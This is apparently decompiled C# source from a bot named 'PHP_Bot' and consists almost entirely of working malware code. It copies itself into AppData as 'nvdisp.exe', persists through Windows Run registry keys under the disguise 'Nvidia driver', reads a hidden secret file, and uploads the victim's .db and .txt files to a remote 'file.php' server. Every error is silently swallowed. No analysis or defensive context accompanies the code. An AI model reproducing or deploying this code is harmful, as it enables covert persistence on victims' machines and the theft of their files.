using System;
using System.Collections.Specialized;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace PHP_Bot;

public static class Methods
{
	public static void startup()
	{
		string text = Application.get_ExecutablePath().ToString();
		string text2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "nvdisp.exe");
		try
		{
			File.Copy(text, text2, overwrite: false);
			text = text2;
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia driver") == null)
			{
				registryKey.SetValue("Nvidia driver", text2);
			}
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia driver") == null)
			{
				registryKey.SetValue("Nvidia driver", text);
			}
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static string GetSecret()
	{
		string result = "";
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\._rss"))
			{
				return "scott";
			}
			StreamReader streamReader = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\._rss");
			result = streamReader.ReadLine();
		}
		catch
		{
		}
		return result;
	}

	public static void UploadFile(string path)
	{
		try
		{
			if (path.EndsWith(".db") || path.EndsWith(".txt"))
			{
				NameValueCollection nameValueCollection = new NameValueCollection();
				nameValueCollection["s"] = Config.Secret;
				UploadFileEx(path, Config.Base + "file.php", "mud", null, nameValueCollection, null);
			}
		}
		catch
		{
		}
	}

	public static string UploadFileEx(string uploadfile, string url, string fileFormName, string contenttype, NameValueCollection querystring, CookieContainer cookies)
	{
		try
		{
			if (fileFormName == null || fileFormName.Length == 0)
			{
				fileFormName = "file";
			}
			if (contenttype == null || contenttype.Length == 0)
			{
				contenttype = "application/octet-stream";
			}
			string text = "?";
			if (querystring != null)
			{
				foreach (string key in querystring.Keys)
				{
					string text3 = text;
					text = text3 + key + "=" + querystring.Get(key) + "&";
				}
			}
			Uri requestUri = new Uri(url + text);
			string text4 = "----------" + DateTime.Now.Ticks.ToString("x");
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUri);
			httpWebRequest.CookieContainer = cookies;
			httpWebRequest.ContentType = "multipart/form-data; boundary=" + text4;
			httpWebRequest.Method = "POST";
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.Append("--");
			stringBuilder.Append(text4);
			stringBuilder.Append("\r\n");
			stringBuilder.Append("Content-Disposition: form-data; name=\"");
			stringBuilder.Append(fileFormName);
			stringBuilder.Append("\"; filename=\"");
			stringBuilder.Append(Path.GetFileName(uploadfile));
			stringBuilder.Append("\"");
			stringBuilder.Append("\r\n");
			stringBuilder.Append("Content-Type: ");
			stringBuilder.Append(contenttype);
			stringBuilder.Append("\r\n");
			stringBuilder.Append("\r\n");
			string s = stringBuilder.ToString();
			byte[] bytes = Encoding.UTF8.GetBytes(s);
			byte[] bytes2 = Encoding.ASCII.GetBytes("\r\n--" + text4 + "\r\n");
			FileStream fileStream = new FileStream(uploadfile, FileMode.Open, FileAccess.Read);
			long num2 = (httpWebRequest.ContentLength = bytes.Length + fileStream.Length + bytes2.Length);
			Stream requestStream = httpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			byte[] array = new byte[checked((uint)Math.Min(4096, (int)fileStream.Length))];
			int num3 = 0;
			while ((num3 = fileStream.Read(array, 0, array.Length)) != 0)
			{
				requestStream.Write(array, 0, num3);
			}
			requestStream.Write(bytes2, 0, bytes2.Length);
			WebResponse response = httpWebRequest.GetResponse();
			Stream responseStream = response.GetResponseStream();
			StreamReader streamReader = new StreamReader(responseStream);
			return streamReader.ReadToEnd();
		}
		catch
		{
		}
		return "";
	}
}
